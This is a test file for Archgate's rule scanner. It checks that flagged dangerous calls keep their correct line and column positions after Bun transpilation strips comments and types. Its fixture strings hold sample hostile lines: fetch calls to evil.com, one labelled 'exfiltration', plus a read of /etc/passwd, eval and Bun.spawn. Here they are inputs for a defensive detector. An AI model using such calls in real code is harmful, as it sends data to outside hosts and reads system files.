// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Archgate
import { describe, expect, test } from "bun:test";

import { scanRuleSource } from "../../src/engine/rule-scanner";

/**
 * Tests for position remapping after transpilation.
 *
 * Bun.Transpiler strips comments, type annotations, and trailing commas,
 * which shifts line numbers in the transpiled output. The scanner remaps
 * violations back to original source positions using string search by
 * occurrence order.
 */
describe("scanRuleSource position remapping", () => {
  test("comments before violation shift line numbers correctly", () => {
    const source = [
      "// comment line 1",
      "// comment line 2",
      "// comment line 3",
      "export default {",
      "  rules: {",
      '    "r": {',
      '      description: "d",',
      "      async check(ctx) {",
      "        Bun.spawn([]);",
      "      },",
      "    },",
      "  },",
      "};",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(1);
    expect(violations[0].line).toBe(9);
    expect(violations[0].column).toBe(8);
    // "Bun.spawn" is 9 chars
    expect(violations[0].endLine).toBe(9);
    expect(violations[0].endColumn).toBe(17);
  });

  test("TypeScript type annotations stripped don't shift lines", () => {
    const source = [
      "export default {",
      "  rules: {",
      '    "r": {',
      '      description: "d",',
      "      async check(ctx: RuleContext) {",
      "        const x: string = 'hello';",
      "        eval(x);",
      "      },",
      "    },",
      "  },",
      "};",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(1);
    expect(violations[0].line).toBe(7);
    expect(violations[0].column).toBe(8);
  });

  test("multi-line type declarations stripped shift subsequent lines", () => {
    const source = [
      "interface Config {",
      "  name: string;",
      "  value: number;",
      "}",
      "",
      "type Result = string | null;",
      "",
      "Bun.spawn([]);",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(1);
    expect(violations[0].line).toBe(8);
    expect(violations[0].column).toBe(0);
  });

  test("trailing commas removed don't affect position", () => {
    const source = [
      "export default {",
      "  rules: {",
      '    "r": {',
      '      description: "d",',
      "      async check(ctx) {",
      "        fetch(",
      '          "https://evil.com",',
      "        );",
      "      },",
      "    },",
      "  },",
      "};",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(1);
    expect(violations[0].line).toBe(6);
    expect(violations[0].column).toBe(8);
  });

  test("multiple occurrences of same pattern map to correct lines", () => {
    const source = [
      "// first usage",
      "Bun.spawn([]);",
      "",
      "// second usage",
      "Bun.spawn([]);",
      "",
      "// third usage",
      "Bun.spawn([]);",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(3);
    expect(violations[0].line).toBe(2);
    expect(violations[1].line).toBe(5);
    expect(violations[2].line).toBe(8);
  });

  test("mixed violation types each map correctly", () => {
    const source = [
      "// imports at top",
      'import { readFileSync } from "node:fs";',
      "",
      "// some code",
      "const x = 1;",
      "",
      "// dangerous API",
      "Bun.spawn([]);",
      "",
      "// exfiltration",
      'fetch("https://evil.com");',
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(3);

    const importV = violations.find((v) => v.message.includes('"node:fs"'));
    expect(importV).toBeDefined();
    expect(importV!.line).toBe(2);

    const spawnV = violations.find((v) => v.message.includes("Bun.spawn"));
    expect(spawnV).toBeDefined();
    expect(spawnV!.line).toBe(8);

    const fetchV = violations.find((v) => v.message.includes("fetch()"));
    expect(fetchV).toBeDefined();
    expect(fetchV!.line).toBe(11);
  });

  test("realistic rule file with comments, types, and deep nesting", () => {
    // Mimics the real DATA-017 case: 2 comment lines at top push Bun.spawn
    // from transpiled line 12 to original line 18
    const lines = [
      "// ADR: DATA-017 — Schema Migration Management", // 1
      "// Rule: Schema must be in sync with migrations", // 2
      "", // 3
      "export default {", // 4
      "  rules: {", // 5
      '    "migration-sync": {', // 6
      '      description: "Check",', // 7
      "      async check(ctx) {", // 8
      "        try {", // 9
      '          await ctx.readFile("drizzle.config.ts");', // 10
      "        } catch { return; }", // 11
      "        try {", // 12
      "          const proc = Bun.spawn(", // 13
      '            ["bun", "drizzle-kit", "check"],', // 14
      '            { cwd: ctx.projectRoot, stdout: "pipe" },', // 15
      "          );", // 16
      "        } catch {}", // 17
      "      },", // 18
      "    },", // 19
      "  },", // 20
      "};", // 21
    ];
    const violations = scanRuleSource(lines.join("\n"));
    expect(violations).toHaveLength(1);
    expect(violations[0].message).toContain("Bun.spawn()");
    expect(violations[0].line).toBe(13);
    expect(violations[0].column).toBe(23);
    expect(violations[0].endColumn).toBe(32);
  });

  test("inline comments between violations", () => {
    const source = [
      "Bun.spawn([]); // first spawn",
      "// a comment",
      "// another comment",
      "Bun.file('/etc/passwd'); // read a file",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(2);
    expect(violations[0].line).toBe(1);
    expect(violations[0].message).toContain("Bun.spawn()");
    expect(violations[1].line).toBe(4);
    expect(violations[1].message).toContain("Bun.file()");
  });

  test("violation on first line has correct position", () => {
    const source = 'Bun.write("out.txt", "data");';
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(1);
    expect(violations[0].line).toBe(1);
    expect(violations[0].column).toBe(0);
    expect(violations[0].endLine).toBe(1);
    expect(violations[0].endColumn).toBe(9);
  });

  test("violation deeply indented has correct column", () => {
    const source = [
      "export default {",
      "  rules: {",
      '    "r": {',
      '      description: "d",',
      "      async check() {",
      "        if (true) {",
      "          if (true) {",
      '            eval("code");',
      "          }",
      "        }",
      "      },",
      "    },",
      "  },",
      "};",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(1);
    expect(violations[0].line).toBe(8);
    expect(violations[0].column).toBe(12);
  });

  test("satisfies keyword stripped doesn't affect positions above", () => {
    const source = [
      "Bun.spawn([]);",
      "",
      "export default {",
      "  rules: {},",
      "} satisfies RuleSet;",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(1);
    expect(violations[0].line).toBe(1);
    expect(violations[0].column).toBe(0);
  });

  test("generic type parameters stripped don't shift positions", () => {
    const source = [
      "const arr: Array<string> = [];",
      "const map: Map<string, number> = new Map();",
      "eval('code');",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(1);
    expect(violations[0].line).toBe(3);
    expect(violations[0].column).toBe(0);
  });

  test("block comment spanning multiple lines", () => {
    const source = [
      "/**",
      " * This is a block comment",
      " * spanning multiple lines",
      " */",
      "Bun.spawn([]);",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(1);
    expect(violations[0].line).toBe(5);
    expect(violations[0].column).toBe(0);
  });

  test("enum declaration stripped shifts subsequent lines", () => {
    const source = [
      "enum Status {",
      "  Active = 'active',",
      "  Inactive = 'inactive',",
      "}",
      "",
      "fetch('https://evil.com');",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(1);
    expect(violations[0].line).toBe(6);
  });

  test("different Bun APIs on consecutive lines", () => {
    const source = [
      "Bun.spawn([]);",
      "Bun.write('/tmp/x', 'y');",
      "Bun.file('/etc/passwd');",
    ].join("\n");
    const violations = scanRuleSource(source);
    expect(violations).toHaveLength(3);
    expect(violations[0].line).toBe(1);
    expect(violations[0].message).toContain("Bun.spawn()");
    expect(violations[1].line).toBe(2);
    expect(violations[1].message).toContain("Bun.write()");
    expect(violations[2].line).toBe(3);
    expect(violations[2].message).toContain("Bun.file()");
  });
});
